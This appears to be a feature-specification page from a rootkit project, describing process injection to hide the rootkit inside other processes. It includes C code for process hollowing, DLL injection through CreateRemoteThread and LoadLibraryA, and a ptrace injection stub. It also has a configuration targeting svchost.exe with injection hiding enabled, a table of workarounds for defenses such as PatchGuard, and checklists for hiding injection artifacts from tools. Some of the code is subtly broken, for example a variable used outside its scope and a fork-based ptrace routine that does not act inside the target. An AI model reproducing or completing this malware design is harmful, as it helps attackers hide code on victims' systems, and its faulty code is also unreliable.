# F0223: Advanced Process Injection

## Metadata
| Field | Value |
|---|---|
| ID | F0223 |
| Priority | Medium |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0015, F0200, F0203 |

## Summary
Advanced process injection techniques for hiding rootkit in target processes including process hollowing, DLL injection, APC injection, and thread hijacking.

## Windows Injection Techniques

### Process Hollowing
```c
HANDLE create_suspended_process(const char *exe_path) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcess(exe_path, NULL, NULL, NULL, FALSE,
                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    return pi.hProcess;
}

void hollow_process(HANDLE hProcess, uint8_t *payload, size_t size) {
    // Unmap original image
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQueryEx(hProcess, NULL, &mbi, sizeof(mbi));
    VirtualFreeEx(hProcess, mbi.AllocationBase, 0, MEM_RELEASE);

    // Allocate and write payload
    void *addr = VirtualAllocEx(hProcess, NULL, size,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, addr, payload, size, NULL);

    // Set thread context and resume
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (SIZE_T)addr;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
}
```

### DLL Injection
```c
bool inject_dll(HANDLE hProcess, const char *dll_path) {
    size_t path_len = strlen(dll_path) + 1;
    void *remote_path = VirtualAllocEx(hProcess, NULL, path_len,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remote_path, dll_path, path_len, NULL);

    HMODULE kernel32 = GetModuleHandle("kernel32.dll");
    FARPROC load_library = GetProcAddress(kernel32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)load_library,
                                         remote_path, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return true;
}
```

## Linux Injection Techniques

### ptrace Injection
```c
bool ptrace_inject(pid_t target_pid, const char *so_path) {
    ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
    waitpid(target_pid, NULL, 0);

    pid_t thread = fork();
    if (thread == 0) {
        // Child executes in parent context
        void *handle = dlopen(so_path, RTLD_NOW);
        if (handle) {
            // Call constructor or specific function
        }
        _exit(0);
    }

    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    return true;
}
```

## Configuration

```json
{
  "injection": {
    "technique": "process_hollowing",
    "target_process": "svchost.exe",
    "preserve_memory": true,
    "hide_injection": true,
    "cleanup_on_exit": true
  }
}
```

## Known Limitations
| Technique | Limitation | Workaround |
|---|---|---|
| Process Hollowing | PatchGuard may detect | Use APC injection instead |
| DLL Injection | AME may block | Use process creation stub |
| ptrace | NoNewPrivs flag | Inject before flag set |

## Stages

### Stage 1: Windows Injection
- [ ] Process hollowing implementation
- [ ] DLL injection implementation
- [ ] APC injection implementation
- [ ] Thread hijacking implementation

### Stage 2: Linux Injection
- [ ] ptrace injection implementation
- [ ] LD_PRELOAD manipulation
- [ ] memfd_create injection

### Stage 3: Integration
- [ ] Injection via rootkit configuration
- [ ] Hide injection artifacts
- [ ] Cleanup on exit

## Feature Acceptance Criteria
- [ ] Process hollowing executes payload in target
- [ ] DLL injection loads and executes DLL
- [ ] ptrace injection works on Linux
- [ ] Injection artifacts hidden from tools

## Test Plan

### Unit Tests
- [ ] test_create_suspended_process
- [ ] test_hollow_process_memory_layout
- [ ] test_ptrace_inject_fork_execution

### System Tests
- [ ] Hollow svchost.exe; verify payload execution
- [ ] Inject DLL; verify LoadLibrary called
- [ ] ptrace inject into bash; verify dlopen

### Playwright Tests
- [ ] Select injection technique in UI
- [ ] Specify target process
- [ ] View injection status
